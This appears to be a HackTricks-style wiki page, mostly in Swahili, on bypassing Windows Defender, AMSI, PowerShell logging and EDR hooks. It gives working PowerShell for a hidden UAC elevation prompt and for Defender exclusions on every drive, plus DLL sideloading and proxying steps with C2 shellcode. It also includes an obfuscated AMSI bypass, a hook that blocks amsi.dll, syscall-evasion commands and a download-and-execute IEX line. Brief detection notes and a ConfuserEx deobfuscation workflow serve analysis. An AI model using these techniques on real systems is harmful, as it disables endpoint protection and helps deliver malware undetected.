# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Ukurasa huu uliandikwa awali na** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Chombo cha kusimamisha Windows Defender kufanya kazi.
- [no-defender](https://github.com/es3n1n/no-defender): Chombo cha kusimamisha Windows Defender kufanya kazi kwa kujifanya AV nyingine.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Installer-style UAC bait before tampering with Defender

Public loaders zinazojifanya kuwa game cheats mara nyingi husafirishwa kama visakinishi vya Node.js/Nexe visivyo na saini ambavyo kwanza **humwomba mtumiaji kwa elevation** na kisha huondoa uwezo wa Defender. Mlolongo ni rahisi:

1. Chunguza uwepo wa muktadha wa admin kwa `net session`. Amri hii hufaulu tu wakati mwita ana haki za admin, hivyo kushindwa kunaonyesha kuwa loader inaendeshwa kama mtumiaji wa kawaida.
2. Mara moja ijizindue tena kwa `RunAs` verb ili kuchochea UAC consent prompt inayotarajiwa huku ikihifadhi original command line.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Waathiriwa tayari wanaamini wanasakinisha programu “cracked”, kwa hiyo ombi kwa kawaida hukubaliwa, na hivyo kuipa malware ruhusa inayohitaji kubadilisha sera ya Defender.

### Blanket `MpPreference` exclusions for every drive letter

Mara tu inapopandishwa cheo, minyororo ya mtindo wa GachiLoader huongeza maeneo ya upofu ya Defender badala ya kuzima huduma moja kwa moja. Kwanza loader huua GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) kisha husukuma **exclusions pana sana** ili kila user profile, system directory, na removable disk iwe isiyoweza kuchunguzwa:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Mazingatio muhimu:

- Kitanzi hupitia kila filesystem iliyomountiwa (D:\, E:\, USB sticks, n.k.) hivyo **payload yoyote ya baadaye itakayodondoshwa popote kwenye disk inapuuziwa**.
- Uondolewaji wa `.sys` extension ni wa kuangalia mbele—washambuliaji huhifadhi chaguo la kupakia unsigned drivers baadaye bila kugusa Defender tena.
- Mabadiliko yote yanaingia chini ya `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, hivyo hatua za baadaye zinaweza kuthibitisha kuwa exclusions zinaendelea kuwepo au kuzipanua bila kuchochea UAC tena.

Kwa kuwa hakuna Defender service inayosimamishwa, health checks za kawaida zinaendelea kuripoti “antivirus active” hata ingawa real-time inspection haigusi kamwe njia hizo.

## **AV Evasion Methodology**

Kwa sasa, AVs hutumia mbinu tofauti kuangalia kama faili ni malicious au la, static detection, dynamic analysis, na kwa EDRs za juu zaidi, behavioural analysis.

### **Static detection**

Static detection hupatikana kwa kuweka alama strings au arrays za bytes zinazojulikana kuwa malicious ndani ya binary au script, na pia kutoa taarifa kutoka kwenye faili lenyewe (k.m. file description, company name, digital signatures, icon, checksum, n.k.). Hii inamaanisha kwamba kutumia public tools zinazojulikana kunaweza kukufanya ushikwe kwa urahisi zaidi, kwa sababu huenda tayari zimechambuliwa na kuwekwa alama kuwa malicious. Kuna njia kadhaa za kuepuka aina hii ya detection:

- **Encryption**

Uki- encrypt binary, hakutakuwa na njia kwa AV ya kugundua program yako, lakini utahitaji aina fulani ya loader ili ku-decrypt na kuendesha program kwenye memory.

- **Obfuscation**

Wakati mwingine unachohitaji tu ni kubadilisha strings fulani kwenye binary au script yako ili ipite AV, lakini hii inaweza kuchukua muda mwingi kulingana na unachojaribu ku-obfuscate.

- **Custom tooling**

Ukitengeneza tools zako mwenyewe, hakutakuwa na known bad signatures, lakini hii inachukua muda mwingi na juhudi.

> [!TIP]
> Njia nzuri ya kuangalia dhidi ya Windows Defender static detection ni [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Kimsingi hugawa faili vipande vingi kisha huambia Defender ichunguze kila kimoja kando, kwa njia hii, inaweza kukuambia kwa usahihi strings au bytes zipi zimewekewa alama kwenye binary yako.

Ninapendekeza sana uangalie hii [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) kuhusu practical AV Evasion.

### **Dynamic analysis**

Dynamic analysis ni wakati AV inaendesha binary yako ndani ya sandbox na kuangalia malicious activity (k.m. kujaribu ku-decrypt na kusoma passwords za browser yako, kufanya minidump kwenye LSASS, n.k.). Sehemu hii inaweza kuwa ngumu kidogo kufanya kazi nayo, lakini hapa kuna mambo kadhaa unayoweza kufanya ili kuepuka sandboxes.

- **Sleep before execution** Kulingana na jinsi ilivyo-implementwa, inaweza kuwa njia nzuri sana ya bypassing AV's dynamic analysis. AVs zina muda mfupi sana wa kuchunguza faili ili zisivuruge workflow ya mtumiaji, hivyo kutumia sleeps ndefu kunaweza kuvuruga analysis ya binaries. Tatizo ni kwamba sandboxes nyingi za AV zinaweza tu kuruka sleep kulingana na jinsi ilivyo-implementwa.
- **Checking machine's resources** Kwa kawaida Sandboxes huwa na resources chache sana za kufanya kazi nazo (k.m. < 2GB RAM), vinginevyo zinaweza kupunguza kasi ya machine ya mtumiaji. Unaweza pia kuwa mbunifu sana hapa, kwa mfano kwa kuangalia CPU temperature au hata fan speeds, si kila kitu kitakuwa kime-implementwa kwenye sandbox.
- **Machine-specific checks** Ikiwa unataka kulenga user whose workstation is joined to the "contoso.local" domain, unaweza kufanya check kwenye domain ya computer ili kuona kama inalingana na uliyoainisha; ikiwa hailingani, unaweza kufanya program yako itoke.

Inageuka kuwa computername ya Microsoft Defender's Sandbox ni HAL9TH, hivyo, unaweza kuangalia computer name kwenye malware yako kabla ya detonation, ikiwa name inalingana na HAL9TH, inamaanisha uko ndani ya defender's sandbox, hivyo unaweza kufanya program yako itoke.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Vidokezo vingine vizuri sana kutoka kwa [@mgeeky](https://twitter.com/mariuszbit) vya kwenda dhidi ya Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Kama tulivyosema hapo awali kwenye post hii, **public tools** hatimaye **zitagunduliwa**, hivyo, unapaswa kujiuliza kitu:

Kwa mfano, ikiwa unataka kudump LSASS, **kwa kweli unahitaji kutumia mimikatz**? Au unaweza kutumia project tofauti ambayo haijulikani sana na pia inadump LSASS.

Jibu sahihi labda ni la pili. Ukichukua mimikatz kama mfano, huenda ni mojawapo ya, kama si ndiyo, sehemu ya malware inayowekwa alama zaidi na AVs na EDRs, wakati project yenyewe ni super cool, pia ni nightmare kufanya kazi nayo ili kuzunguka AVs, hivyo tafuta tu alternatives kwa unachojaribu kufanikisha.

> [!TIP]
> Unapobadilisha payloads zako kwa ajili ya evasion, hakikisha **umezima automatic sample submission** katika defender, na tafadhali, kwa uzito wote, **USIPAKISHE KWENYE VIRUSTOTAL** ikiwa lengo lako ni kufanikisha evasion kwa muda mrefu. Ikiwa unataka kuangalia kama payload yako inagunduliwa na AV fulani, isakinishe kwenye VM, jaribu kuzima automatic sample submission, na uijaribu hapo hadi uridhike na matokeo.

## EXEs vs DLLs

Wakati wowote inapowezekana, kila mara **prioritize kutumia DLLs kwa ajili ya evasion**, kwa uzoefu wangu, DLL files kwa kawaida huwa **hazigunduliwi sana na hazichambuliwi sana**, hivyo ni trick rahisi sana kutumia ili kuepuka detection katika baadhi ya kesi (ikiwa payload yako ina njia yoyote ya kuendeshwa kama DLL, bila shaka).

Kama tunavyoona kwenye picha hii, DLL Payload kutoka Havoc ina detection rate ya 4/26 kwenye antiscan.me, wakati EXE payload ina detection rate ya 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Sasa tutaonyesha tricks kadhaa unazoweza kutumia na DLL files ili kuwa stealthier zaidi.

## DLL Sideloading & Proxying

**DLL Sideloading** hutumia DLL search order inayotumiwa na loader kwa kuweka both the victim application na malicious payload(s) sambamba karibu na kila mmoja.

Unaweza kuangalia programs zinazoshambuliwa na DLL Sideloading kwa kutumia [Siofra](https://github.com/Cybereason/siofra) na script ifuatayo ya powershell:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Amri hii itatoa orodha ya programu zinazoweza kuathiriwa na DLL hijacking ndani ya "C:\Program Files\\" na faili za DLL wanazojaribu kupakia.

Ninapendekeza sana u**chunguze programu zinazoweza kufanyiwa DLL Hijack/Sideloading mwenyewe**, mbinu hii ni ya kujificha sana ikifanywa vizuri, lakini ukitumia programu za DLL Sideloadable zinazojulikana hadharani, unaweza kubanwa kirahisi.

Kwa kuweka tu DLL hasidi yenye jina ambalo programu inatarajia kupakia, haitapakua payload yako, kwa sababu programu inatarajia baadhi ya functions maalum ndani ya DLL hiyo; ili kurekebisha tatizo hili, tutatumia mbinu nyingine inayoitwa **DLL Proxying/Forwarding**.

**DLL Proxying** hupeleka calls ambazo programu hufanya kutoka kwenye proxy (na hasidi) DLL kwenda kwenye DLL halisi, hivyo kuhifadhi utendaji wa programu na kuweza kushughulikia utekelezaji wa payload yako.

Nitatumia mradi [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) kutoka kwa [@flangvik](https://twitter.com/Flangvik/)

Hizi ndizo hatua nilizofuatilia:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Amri ya mwisho itatupatia faili 2: kiolezo cha msimbo wa chanzo cha DLL, na DLL ya asili iliyobadilishwa jina.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Haya ndiyo matokeo:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Shellcode yetu yote mbili (iliyoodiwa kwa [SGN](https://github.com/EgeBalci/sgn)) na proxy DLL zina kiwango cha utambuzi cha 0/26 katika [antiscan.me](https://antiscan.me)! Ningeliiita hiyo mafanikio.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ninapendekeza **sana** utazame [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) kuhusu DLL Sideloading na pia [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) ili ujifunze zaidi kuhusu kile tulichojadili kwa undani zaidi.

### Kutumia vibaya Forwarded Exports (ForwardSideLoading)

Windows PE modules zinaweza kusafirisha functions ambazo kwa kweli ni "forwarders": badala ya kuelekeza kwenye code, ingizo la export linakuwa na ASCII string ya umbo `TargetDll.TargetFunc`. Wakati caller anaporesolve export, Windows loader ata:

- Load `TargetDll` ikiwa haijakuwa loaded tayari
- Resolve `TargetFunc` kutoka humo

Tabia muhimu za kuelewa:
- Ikiwa `TargetDll` ni KnownDLL, hutolewa kutoka namespace iliyolindwa ya KnownDLLs (mfano, ntdll, kernelbase, ole32).
- Ikiwa `TargetDll` si KnownDLL, mpangilio wa kawaida wa kutafuta DLL hutumika, ambao unajumuisha directory ya module inayofanya forward resolution.

Hii huwezesha indirect sideloading primitive: tafuta signed DLL inayosafirisha function iliyoforwardiwa kwenda kwa jina la module lisilo la KnownDLL, kisha weka pamoja DLL hiyo iliyosainiwa na DLL inayodhibitiwa na mshambulizi yenye jina sawasawa na module lengwa iliyoforwardiwa. Wakati forwarded export inapoitwa, loader huresolve forward na ku-load DLL yako kutoka directory hiyo hiyo, ikitekeleza DllMain yako.

Mfano uliobainika kwenye Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` si `KnownDLL`, kwa hiyo inatatuliwa kupitia kawaida ya mpangilio wa utafutaji.

PoC (copy-paste):
1) Nakili signed system DLL hadi kwenye folda inayoweza kuandikwa
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Weka `NCRYPTPROV.dll` yenye nia ovu kwenye folda ileile. `DllMain` ya chini kabisa inatosha kupata utekelezaji wa code; huhitaji kutekeleza function iliyoforwardiwa ili kuchochea `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Chochea forward kwa signed LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Tabia iliyozingatiwa:
- rundll32 (signed) inapakia side-by-side `keyiso.dll` (signed)
- Wakati wa kusuluhisha `KeyIsoSetAuditingInterface`, loader hufuata forward hadi `NCRYPTPROV.SetAuditingInterface`
- Kisha loader hupakia `NCRYPTPROV.dll` kutoka `C:\test` na kutekeleza `DllMain` yake
- Ikiwa `SetAuditingInterface` haijatekelezwa, utapata kosa la "missing API" tu baada ya `DllMain` tayari kuwa imeendeshwa

Vidokezo vya hunting:
- Zingatia forwarded exports ambako target module si KnownDLL. KnownDLLs zimeorodheshwa chini ya `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Unaweza kuorodhesha forwarded exports kwa kutumia tooling kama:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Tazama Windows 11 forwarder inventory kutafuta candidates: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Fuatilia LOLBins (k.m. rundll32.exe) ikipakia signed DLLs kutoka non-system paths, ikifuatiwa na kupakia non-KnownDLLs zenye base name ileile kutoka kwenye directory hiyo
- Toa alert kwenye process/module chains kama: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` chini ya user-writable paths
- Tekeleza code integrity policies (WDAC/AppLocker) na kataza write+execute kwenye application directories

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Unaweza kutumia Freeze kupakia na kutekeleza shellcode yako kwa njia ya siri.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ni mchezo wa paka na panya tu, kile kinachofanya kazi leo kinaweza kugunduliwa kesho, kwa hiyo usitegemee chombo kimoja tu; ikiwezekana, jaribu kuunganisha mbinu nyingi za evasion.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRs mara nyingi huweka **user-mode inline hooks** kwenye `ntdll.dll` syscall stubs. Ili kupita hooks hizo, unaweza kutengeneza **direct** au **indirect** syscall stubs zinazopakia **SSN** sahihi (System Service Number) na kuhamia kernel mode bila kutekeleza hooked export entrypoint.

**Invocation options:**
- **Direct (embedded)**: toa maagizo ya `syscall`/`sysenter`/`SVC #0` ndani ya stub iliyozalishwa (hakuna hit kwenye `ntdll` export).
- **Indirect**: ruka ndani ya `syscall` gadget iliyopo ndani ya `ntdll` ili kernel transition ionekane inatoka `ntdll` (inafaa kwa heuristic evasion); **randomized indirect** huchagua gadget kutoka pool kwa kila call.
- **Egg-hunt**: epuka kupachika static `0F 05` opcode sequence kwenye disk; suluhisha syscall sequence wakati wa runtime.

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: tambua SSN kwa kupanga syscall stubs kulingana na virtual address badala ya kusoma bytes za stub.
- **SyscallsFromDisk**: weka `\KnownDlls\ntdll.dll` safi, soma SSN kutoka `.text` yake, kisha ondoa (bypasses all in-memory hooks).
- **RecycledGate**: changanya VA-sorted SSN inference na opcode validation wakati stub ni safi; rudi kwenye VA inference ikiwa imehookiwa.
- **HW Breakpoint**: weka DR0 kwenye `syscall` instruction na tumia VEH kunasa SSN kutoka `EAX` wakati wa runtime, bila kuchambua bytes zilizohookiwa.

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI iliundwa ili kuzuia "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Awali, AVs zilikuwa zinaweza tu kuchanganua **files kwenye disk**, hivyo kama ungeweza kwa njia fulani kuendesha payloads **moja kwa moja ndani ya memory**, AV isingeweza kufanya chochote kuizuia, kwa sababu haikuwa na visibility ya kutosha.

Kipengele cha AMSI kimeunganishwa kwenye hizi components za Windows.

- User Account Control, au UAC (elevation ya EXE, COM, MSI, au ActiveX installation)
- PowerShell (scripts, matumizi ya interactive, na dynamic code evaluation)
- Windows Script Host (wscript.exe na cscript.exe)
- JavaScript na VBScript
- Office VBA macros

Inaruhusu antivirus solutions kukagua tabia ya script kwa kufichua contents za script katika fomu ambayo haijasimbwa na haijafichwa.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Notice how it prepends `amsi:` and then the path to the executable from which the script ran, in this case, powershell.exe

Hatuku-drop faili lolote kwenye disk, lakini bado tulikamatwa ndani ya memory kwa sababu ya AMSI.

Zaidi ya hayo, kuanzia **.NET 4.8**, C# code pia hupitishwa kupitia AMSI. Hii hata huathiri `Assembly.Load(byte[])` kwa load ya in-memory execution. Ndiyo maana kutumia matoleo ya chini ya .NET (kama 4.7.2 au chini yake) kunapendekezwa kwa in-memory execution kama unataka kukwepa AMSI.

Kuna njia kadhaa za kuzunguka AMSI:

- **Obfuscation**

Kwa kuwa AMSI hasa hufanya kazi na static detections, hivyo, kubadilisha scripts unazojaribu ku-load kunaweza kuwa njia nzuri ya evade detection.

Hata hivyo, AMSI ina uwezo wa unobfuscating scripts hata kama zina layers nyingi, hivyo obfuscation inaweza kuwa chaguo baya kulingana na jinsi ilivyofanywa. Hii hufanya evasions isiwe moja kwa moja. Ingawa, wakati mwingine, unachohitaji ni kubadilisha majina machache ya variables na utakuwa sawa, kwa hiyo inategemea ni kiasi gani kitu fulani kimeflagwa.

- **AMSI Bypass**

Kwa kuwa AMSI imeimplementiwa kwa ku-load DLL ndani ya mchakato wa powershell (pia cscript.exe, wscript.exe, etc.) process, inawezekana kuibadilisha kwa urahisi hata ukiendesha kama user asiye na privilege. Kwa sababu ya kasoro hii katika implementation ya AMSI, researchers wamepata njia nyingi za kukwepa AMSI scanning.

**Forcing an Error**

Kulazimisha initialization ya AMSI ishindwe (amsiInitFailed) kutasababisha hakuna scan kuanzishwa kwa current process. Hapo awali hili lilifichuliwa na [Matt Graeber](https://twitter.com/mattifestation) na Microsoft imeunda signature ya kuzuia matumizi mapana zaidi.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Ilichukua tu mstari mmoja wa code ya powershell kufanya AMSI isitumike kwa powershell process ya sasa. Bila shaka mstari huu umeflagged na AMSI yenyewe, kwa hiyo modification fulani inahitajika ili kutumia technique hii.

Hapa kuna AMSI bypass iliyorekebishwa niliyochukua kutoka kwenye hii [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Kumbuka, kwamba hii pengine itapata flag mara tu chapisho hili litakapotoka, kwa hivyo hupaswi kuchapisha code yoyote ikiwa mpango wako ni kubaki bila kugunduliwa.

**Memory Patching**

Mbinu hii iligunduliwa awali na [@RastaMouse](https://twitter.com/_RastaMouse/) na inahusisha kupata address ya function ya "AmsiScanBuffer" katika amsi.dll (inayohusika na kuchanganua input iliyotolewa na user) na kuiandika upya kwa instructions za kurudisha code ya E_INVALIDARG, kwa njia hii, result ya scan halisi itarudisha 0, ambayo inatafsiriwa kama result safi.

> [!TIP]
> Tafadhali soma [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) kwa maelezo ya kina zaidi.

Pia zipo mbinu nyingine nyingi zinazotumika ku-bypass AMSI kwa powershell, angalia [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) na [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) ili kujifunza zaidi kuzihusu.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI huanzishwa tu baada ya `amsi.dll` kupakiwa ndani ya process ya sasa. Njia thabiti, isiyotegemea language, ya bypass ni kuweka user‑mode hook kwenye `ntdll!LdrLoadDll` ambayo inarudisha error wakati module iliyoombwa ni `amsi.dll`. Matokeo yake, AMSI haipakii kamwe na hakuna scans zinazofanyika kwa process hiyo.

Muhtasari wa implementation (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- Hufanya kazi kwenye PowerShell, WScript/CScript na custom loaders kwa pamoja (chochote ambacho vinginevyo kingepakia AMSI).
- Changanya na kuingiza scripts kupitia stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) ili kuepuka long command-line artefacts.
- Imeonekana ikitumiwa na loaders zinazoendeshwa kupitia LOLBins (kwa mfano, `regsvr32` ikimwita `DllRegisterServer`).

The tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** also generates script to bypass AMSI.
The tool **[https://amsibypass.com/](https://amsibypass.com/)** also generates script to bypass AMSI that avoid signature by randomized user-defined function, variables, characters expression and applies random character casing to PowerShell keywords to avoid signature.

**Remove the detected signature**

Unaweza kutumia tool kama **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** na **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** ili kuondoa AMSI signature iliyogunduliwa kutoka kwenye memory ya current process. Tool hii hufanya kazi kwa kuchanganua memory ya current process kwa AMSI signature na kisha kuiandika upya kwa NOP instructions, hivyo kuiondoa kutoka memory.

**AV/EDR products that uses AMSI**

Unaweza kupata orodha ya AV/EDR products zinazotumia AMSI kwenye **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use Powershell version 2**
Ukihitaji PowerShell version 2, AMSI haitapakiwa, hivyo unaweza kuendesha scripts zako bila kuchunguzwa na AMSI. Unaweza kufanya hivi:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging ni kipengele kinachokuwezesha kurekodi amri zote za PowerShell zinazotekelezwa kwenye mfumo. Hii inaweza kuwa muhimu kwa auditing na troubleshooting, lakini pia inaweza kuwa **tatizo kwa washambuliaji wanaotaka kuepuka detection**.

Ili bypass PowerShell logging, unaweza kutumia techniques zifuatazo:

- **Disable PowerShell Transcription and Module Logging**: Unaweza kutumia tool kama [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) kwa madhumuni haya.
- **Use Powershell version 2**: Ukitumia PowerShell version 2, AMSI haitapakiwa, hivyo unaweza kuendesha scripts zako bila kuchunguzwa na AMSI. Unaweza kufanya hivi: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Tumia [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) ili spawn a powershell withuot defenses (hivi ndivyo `powerpick` kutoka Cobal Strike inavyotumia).


## Obfuscation

> [!TIP]
> Several obfuscation techniques relies on encrypting data, which will increase the entropy of the binary which will make easier for AVs and EDRs to detect it. Be careful with this and maybe only apply encryption to specific sections of your code that is sensitive or needs to be hidden.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Wakati wa kuchambua malware inayotumia ConfuserEx 2 (au commercial forks) ni kawaida kukutana na layers kadhaa za protection ambazo zitazuia decompilers na sandboxes. Workflow hapa chini kwa uhakika **hurejesha IL iliyo karibu–na-asili** ambayo baadaye inaweza decompiled kuwa C# kwa tools kama dnSpy au ILSpy.

1.  Anti-tampering removal – ConfuserEx huencrypt kila *method body* na hui-decrypt ndani ya static constructor ya *module* (`<Module>.cctor`).  Hii pia hu-patch PE checksum hivyo mabadiliko yoyote yatacrash binary.  Tumia **AntiTamperKiller** ili kupata metadata tables zilizoencrypted, recover XOR keys na rewrite assembly safi:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output ina parameters 6 za anti-tamper (`key0-key3`, `nameHash`, `internKey`) ambazo zinaweza kuwa useful wakati wa kujenga unpacker yako mwenyewe.

2.  Symbol / control-flow recovery – feed file ya *clean* kwa **de4dot-cex** (a ConfuserEx-aware fork ya de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – select ConfuserEx 2 profile
• de4dot itaondoa control-flow flattening, kurejesha namespaces, classes na variable names asili na decrypt constant strings.

3.  Proxy-call stripping – ConfuserEx hubadilisha direct method calls kuwa lightweight wrappers (a.k.a *proxy calls*) ili kuvunja decompilation zaidi.  Ziondoe kwa **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Baada ya hatua hii unapaswa kuona kawaida .NET API kama `Convert.FromBase64String` au `AES.Create()` badala ya opaque wrapper functions (`Class8.smethod_10`, …).

4.  Manual clean-up – endesha binary inayotokana ndani ya dnSpy, tafuta large Base64 blobs au matumizi ya `RijndaelManaged`/`TripleDESCryptoServiceProvider` ili kupata *real* payload.  Mara nyingi malware huihifadhi kama TLV-encoded byte array iliyoinitialized ndani ya `<Module>.byte_0`.

Mlolongo huu hapo juu hurejesha execution flow **bila** kuhitaji kuendesha sample mbaya – useful unapofanya kazi kwenye offline workstation.

> 🛈  ConfuserEx hutengeneza custom attribute inayoitwa `ConfusedByAttribute` ambayo inaweza kutumika kama IOC ili kufanya triage ya samples kiotomatiki.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
